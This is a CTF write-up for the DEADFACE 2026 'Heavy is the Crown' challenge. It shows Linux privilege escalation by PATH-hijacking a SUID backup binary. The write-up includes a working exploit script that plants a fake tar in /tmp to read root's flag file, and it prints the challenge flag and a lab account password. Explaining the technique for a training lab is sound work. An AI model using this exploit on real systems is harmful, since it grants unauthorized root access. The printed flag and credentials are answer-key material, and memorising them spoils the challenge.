---
title: Heavy is the Crown
tags:
  - DEADFACE CTF 2026
  - Exploitation
  - Linux
  - Forensics
---

# Heavy is the Crown

| | |
|---|---|
| **CTF** | DEADFACE CTF 2026 |
| **Category** | Hostbusters · Forensics / Linux priv-esc |
| **Points** | 500 |
| **Author** | @syyntax |
| **Writeup by** | [TheMusk3teers](../../../members.md)<br>[H0ussamCl4p](https://github.com/H0ussamCl4p) · [chaimae098](https://github.com/chaimae098) · [fatimaezzahralag-ship-it](https://github.com/fatimaezzahralag-ship-it) · [imanebouzbiba](https://github.com/imanebouzbiba) |

## Challenge

> You've reached `mort1cia`, the DEADFACE second-in-command. Only `root` is above you now — and `root` holds the master Kingmaker payload.
>
> Read the final flag from `root`'s home.
>
> Submit as `deadface{...}`.

Access: `https://hostbusters.dctf.io/` (final stage of the `charon` chain after [Old Habits](old-habits.md))

## Solution

### 1. Inspecting `/usr/local/bin/charon-backup`

Once logged in as `mort1cia` (`princess2015`), checking SUID binaries and `mort1cia`'s group memberships reveals `/usr/local/bin/charon-backup`, which is owned by `root` with the SUID bit set:

```bash
ls -la /usr/local/bin/charon-backup
strings /usr/local/bin/charon-backup | grep tar
```

Inspecting the binary shows that it archives `/opt/ops` into `/var/backups/charon-ops.tgz` by invoking **`tar` via `PATH`** (`tar -czf /var/backups/charon-ops.tgz /opt/ops`) rather than using an absolute path (`/bin/tar`).

### 2. Escalating to `root` via `PATH` hijacking

Creating a malicious `tar` script in `/tmp` and prepending `/tmp` to `PATH` before executing `/usr/local/bin/charon-backup` runs our script with effective UID `0` (`root`):

```bash
cat << 'EOF' > /tmp/tar
#!/bin/sh
cp /root/flag.txt /tmp/root.flag
chmod 644 /tmp/root.flag
EOF
chmod +x /tmp/tar
PATH=/tmp:$PATH /usr/local/bin/charon-backup
cat /tmp/root.flag
```

```text
deadface{p4th_h1j4ck3d_t0_thr0n3}
```

## Flag

!!! flag "Flag"
    `deadface{p4th_h1j4ck3d_t0_thr0n3}`

## Takeaways

SUID binaries that invoke external commands via `system()`, `popen()`, or `execvp()` without hardcoding an absolute path (`/usr/bin/tar`) and sanitizing `PATH` are trivially exploitable via `PATH` hijacking.
